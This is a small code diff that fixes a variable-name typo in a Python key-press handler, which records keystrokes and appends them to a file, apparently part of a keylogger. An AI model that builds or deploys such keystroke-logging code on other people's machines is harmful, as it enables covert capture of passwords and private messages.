@@ -13,7 +13,7 @@ def on_press(key):
     if count > 0:
         count = 0
         write_to_file(keyboard_Input)
-        keyboardInput = []
+        keyboard_Input = []
 
 def write_to_file(keys):
     with open(path, 'a') as file:
